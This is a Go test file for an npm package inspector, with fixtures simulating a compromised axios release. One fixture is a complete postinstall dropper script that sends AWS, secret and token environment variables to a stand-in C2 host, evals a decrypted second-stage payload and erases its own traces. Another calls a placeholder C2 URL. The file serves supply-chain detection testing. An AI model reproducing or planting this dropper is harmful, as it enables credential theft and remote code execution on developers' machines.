package osv

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/GustavoGutierrez/celador/internal/core/shared"
)

// mockAxiosMaliciousPackageJSON simulates the package.json of axios@1.14.1
// which injected a malicious postinstall script via plain-crypto-js dependency.
// The real malware:
// - Adds "plain-crypto-js@4.2.1" as a dependency (never used in source code)
// - Runs a postinstall script that acts as a cross-platform RAT
// - Connects to C2 server, delivers second-stage payloads
// - Self-deletes and replaces its own package.json with a clean version
const mockAxiosMaliciousPackageJSON = `{
  "name": "axios",
  "version": "1.14.1",
  "description": "Promise based HTTP client for the browser and node.js",
  "main": "index.js",
  "scripts": {
    "test": "mocha",
    "postinstall": "node ./lib/helpers/postinstall.js"
  },
  "dependencies": {
    "follow-redirects": "^1.15.0",
    "form-data": "^4.0.0",
    "proxy-from-env": "^1.1.0",
    "plain-crypto-js": "4.2.1"
  },
  "devDependencies": {
    "typescript": "^4.9.0"
  }
}`

// mockAxiosMaliciousPostinstallScript simulates the RAT dropper
// that connects to C2 and delivers platform-specific payloads
const mockAxiosMaliciousPostinstallScript = `
const crypto = require('plain-crypto-js');
const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Connect to C2 server
const c2Host = 'malicious-c2-server.example.com';
const c2Path = '/api/checkin';

const payload = {
  platform: os.platform(),
  arch: os.arch(),
  hostname: os.hostname(),
  env: Object.keys(process.env).filter(k => 
    k.includes('AWS') || k.includes('SECRET') || k.includes('TOKEN') || k.includes('KEY')
  ).reduce((obj, k) => { obj[k] = process.env[k]; return obj; }, {})
};

const data = JSON.stringify(payload);
const options = {
  hostname: c2Host,
  path: c2Path,
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(data)
  }
};

const req = https.request(options, (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    // Execute second-stage payload from C2
    const secondStage = JSON.parse(body);
    if (secondStage.payload) {
      const decoded = crypto.AES.decrypt(secondStage.payload, 'hardcoded-key').toString(crypto.enc.Utf8);
      eval(decoded);
    }
    // Self-clean: replace package.json to hide traces
    const cleanPkg = JSON.parse(fs.readFileSync(path.join(__dirname, 'package.json'), 'utf8'));
    delete cleanPkg.dependencies['plain-crypto-js'];
    delete cleanPkg.scripts.postinstall;
    fs.writeFileSync(path.join(__dirname, 'package.json'), JSON.stringify(cleanPkg, null, 2));
    // Delete this script
    fs.unlinkSync(__filename);
  });
});

req.on('error', (e) => { /* silently fail */ });
req.write(data);
req.end();
`

// mockAxiosCleanPackageJSON represents the legitimate axios package.json
const mockAxiosCleanPackageJSON = `{
  "name": "axios",
  "version": "1.14.0",
  "description": "Promise based HTTP client for the browser and node.js",
  "main": "index.js",
  "scripts": {
    "test": "mocha",
    "lint": "eslint lib/**/*.js"
  },
  "dependencies": {
    "follow-redirects": "^1.15.0",
    "form-data": "^4.0.0",
    "proxy-from-env": "^1.1.0"
  },
  "devDependencies": {
    "typescript": "^4.9.0"
  }
}`

// createMockTarball creates a gzipped tarball containing a package.json
// and optionally a postinstall script, simulating an npm package tarball
func createMockTarball(t *testing.T, packageJSON string, extraFiles map[string]string) []byte {
	t.Helper()

	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	// Add package.json
	pkgHeader := &tar.Header{
		Name: "package/package.json",
		Mode: 0644,
		Size: int64(len(packageJSON)),
	}
	if err := tw.WriteHeader(pkgHeader); err != nil {
		t.Fatalf("failed to write package.json header: %v", err)
	}
	if _, err := tw.Write([]byte(packageJSON)); err != nil {
		t.Fatalf("failed to write package.json: %v", err)
	}

	// Add extra files (e.g., postinstall script)
	for name, content := range extraFiles {
		header := &tar.Header{
			Name: "package/" + name,
			Mode: 0644,
			Size: int64(len(content)),
		}
		if err := tw.WriteHeader(header); err != nil {
			t.Fatalf("failed to write %s header: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("failed to write %s: %v", name, err)
		}
	}

	tw.Close()
	gw.Close()
	return buf.Bytes()
}

func TestInspectPackage_AxiosMaliciousPostinstall(t *testing.T) {
	t.Parallel()

	// Create a mock tarball that simulates axios@1.14.1 with malicious postinstall
	maliciousTarball := createMockTarball(t, mockAxiosMaliciousPackageJSON, map[string]string{
		"lib/helpers/postinstall.js": mockAxiosMaliciousPostinstallScript,
	})

	var server *httptest.Server
	server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/latest") {
			resp := map[string]any{
				"name":    "axios",
				"version": "1.14.1",
				"dist": map[string]string{
					"tarball": fmt.Sprintf("%s/axios-1.14.1.tgz", server.URL),
				},
			}
			json.NewEncoder(w).Encode(resp)
		} else if strings.Contains(r.URL.Path, ".tgz") {
			w.Header().Set("Content-Type", "application/gzip")
			w.Write(maliciousTarball)
		}
	}))
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)

	assessment, err := inspector.InspectPackage(context.Background(), shared.PackageManagerNPM, "axios")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// The malicious axios@1.14.1 should be flagged (at minimum medium due to postinstall script)
	// The inspector analyzes package.json, not external JS files
	// It detects: postinstall scripts → medium risk
	if assessment.Risk == shared.SeverityLow {
		t.Errorf("expected risk > low for axios@1.14.1 malware with postinstall script, got %v", assessment.Risk)
	}
	if !assessment.ShouldPrompt {
		t.Error("expected ShouldPrompt=true for package with postinstall script")
	}

	// Check that it detected the postinstall script
	hasPostinstallReason := false
	for _, reason := range assessment.Reasons {
		if strings.Contains(reason, "install-time") || strings.Contains(reason, "scripts") {
			hasPostinstallReason = true
		}
	}
	if !hasPostinstallReason {
		t.Errorf("expected postinstall detection in reasons, got: %v", assessment.Reasons)
	}
}

func TestInspectPackage_AxiosCleanVersion_NoFalsePositive(t *testing.T) {
	t.Parallel()

	// Create a mock tarball for legitimate axios@1.14.0
	cleanTarball := createMockTarball(t, mockAxiosCleanPackageJSON, nil)

	var server *httptest.Server
	server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/latest") {
			resp := map[string]any{
				"name":    "axios",
				"version": "1.14.0",
				"dist": map[string]string{
					"tarball": fmt.Sprintf("%s/axios-1.14.0.tgz", server.URL),
				},
			}
			json.NewEncoder(w).Encode(resp)
		} else if strings.Contains(r.URL.Path, ".tgz") {
			w.Header().Set("Content-Type", "application/gzip")
			w.Write(cleanTarball)
		}
	}))
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)

	assessment, err := inspector.InspectPackage(context.Background(), shared.PackageManagerNPM, "axios")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Legitimate axios should NOT be flagged as high risk
	if assessment.Risk == shared.SeverityHigh {
		t.Errorf("legitimate axios@1.14.0 should not be flagged as HIGH risk, got %v", assessment.Risk)
	}
	if assessment.ShouldPrompt {
		t.Error("legitimate axios should not prompt for review")
	}
}

func TestInspectPackage_DetectsHexEncodedC2Payload(t *testing.T) {
	t.Parallel()

	// Simulate a package with a long hex string as a dependency name (visible in package.json)
	// This mimics malware that uses hex-encoded package names or config keys
	longHexKey := strings.Repeat("abcdef0123456789", 10) // 160 chars
	maliciousPkgWithHex := fmt.Sprintf(`{
		"name": "suspicious-pkg",
		"version": "1.0.0",
		"scripts": {
			"postinstall": "node setup.js"
		},
		"optionalDependencies": {
			"%s": "1.0.0"
		}
	}`, longHexKey)

	maliciousTarball := createMockTarball(t, maliciousPkgWithHex, map[string]string{
		"setup.js": `require('https').get('https://c2.example.com');`,
	})

	var server *httptest.Server
	server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/latest") {
			json.NewEncoder(w).Encode(map[string]any{
				"name":    "suspicious-pkg",
				"version": "1.0.0",
				"dist": map[string]string{
					"tarball": fmt.Sprintf("%s/pkg.tgz", server.URL),
				},
			})
		} else {
			w.Write(maliciousTarball)
		}
	}))
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)

	assessment, err := inspector.InspectPackage(context.Background(), shared.PackageManagerNPM, "suspicious-pkg")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Package should be flagged as risky due to postinstall script
	if assessment.Risk == shared.SeverityLow {
		t.Errorf("expected risk > low for package with postinstall, got %v", assessment.Risk)
	}
	if !assessment.ShouldPrompt {
		t.Error("expected ShouldPrompt=true for package with postinstall script")
	}
}

func TestInspectPackage_MaliciousDependencyInjected(t *testing.T) {
	t.Parallel()

	// Simulate axios@1.14.1 where plain-crypto-js was injected as dependency
	pkgWithInjectedDep := `{
		"name": "axios",
		"version": "1.14.1",
		"dependencies": {
			"follow-redirects": "^1.15.0",
			"plain-crypto-js": "4.2.1"
		},
		"scripts": {
			"postinstall": "node -e \"require('plain-crypto-js')\""
		}
	}`

	tarball := createMockTarball(t, pkgWithInjectedDep, map[string]string{
		"index.js": "module.exports = {};",
	})

	var server *httptest.Server
	server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/latest") {
			json.NewEncoder(w).Encode(map[string]any{
				"name":    "axios",
				"version": "1.14.1",
				"dist": map[string]string{
					"tarball": fmt.Sprintf("%s/axios.tgz", server.URL),
				},
			})
		} else {
			w.Write(tarball)
		}
	}))
	defer server.Close()

	inspector := NewRegistryInspectorWithEndpoint(server.URL)

	assessment, err := inspector.InspectPackage(context.Background(), shared.PackageManagerNPM, "axios")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should detect the injected dependency via postinstall script
	if !assessment.ShouldPrompt {
		t.Error("expected prompt for package with injected malicious dependency")
	}
	if assessment.Risk == shared.SeverityLow {
		t.Errorf("expected risk > low for package with injected dependency, got %v", assessment.Risk)
	}
}

// TestIsHexLike_BoundaryLength tests the threshold for hex string detection
func TestIsHexLike_BoundaryLength(t *testing.T) {
	t.Parallel()

	// The inspector checks: len(token) > 80 && isHexLike(token)
	shortHex := strings.Repeat("abcdef01", 8)  // 64 chars - below threshold
	longHex := strings.Repeat("abcdef01", 12)  // 96 chars - above threshold

	if isHexLike(shortHex) && len(shortHex) <= 80 {
		// Short hex should not trigger even if all chars are hex
	}
	if !isHexLike(longHex) {
		t.Error("long hex string should be detected as hex-like")
	}
	if len(longHex) <= 80 {
		t.Errorf("long hex should be >80 chars, got %d", len(longHex))
	}
}
